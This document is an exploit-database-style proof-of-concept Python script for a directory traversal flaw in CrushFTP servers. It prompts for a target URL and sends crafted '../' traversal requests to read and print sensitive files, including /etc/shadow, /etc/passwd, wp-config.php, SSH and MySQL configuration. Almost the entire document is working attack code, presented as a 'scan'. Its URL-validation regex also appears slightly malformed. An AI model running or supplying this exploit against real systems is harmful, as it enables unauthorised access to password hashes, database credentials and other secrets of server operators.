## Exploit Title: CrushFTP Directory Traversal
## Google Dork: N/A
# Date: 2024-04-30
# Exploit Author: [Abdualhadi khalifa (https://twitter.com/absholi_ly)
## Vendor Homepage: https://www.crushftp.com/
## Software Link: https://www.crushftp.com/download/
## Version: below 10.7.1 and 11.1.0 (as well as legacy 9.x)
## Tested on: Windows10

import requests
import re

# Regular expression to validate the URL
def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:A-Z0-9?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' # domain...
        r'localhost|' # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' # ...or ipv4
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)' # ...or ipv6
        r'(?::\d+)?' # optional: port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

# Function to scan for the vulnerability
def scan_for_vulnerability(url, target_files):
    print("Scanning for vulnerability in the following files:")
    for target_file in target_files:
        print(target_file)

    for target_file in target_files:
        try:
            response = requests.get(url + "?/../../../../../../../../../../" + target_file, timeout=10)
            if response.status_code == 200 and target_file.split('/')[-1] in response.text:
                print("vulnerability detected in file", target_file)
                print("Content of file", target_file, ":")
                print(response.text)
            else:
                print("vulnerability not detected or unexpected response for file", target_file)
        except requests.exceptions.RequestException as e:
            print("Error connecting to the server:", e)

# User input
input_url = input("Enter the URL of the CrushFTP server: ")

# Validate the URL
if is_valid_url(input_url):
    # Expanded list of allowed files
    target_files = [
        "/var/www/html/index.php",
        "/var/www/html/wp-config.php",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/ssh/sshd_config",
        "/etc/mysql/my.cnf",
        # Add more files as needed
        
    ]
    # Start the scan
    scan_for_vulnerability(input_url, target_files)
else:
    print("Invalid URL entered. Please enter a valid URL.")
            
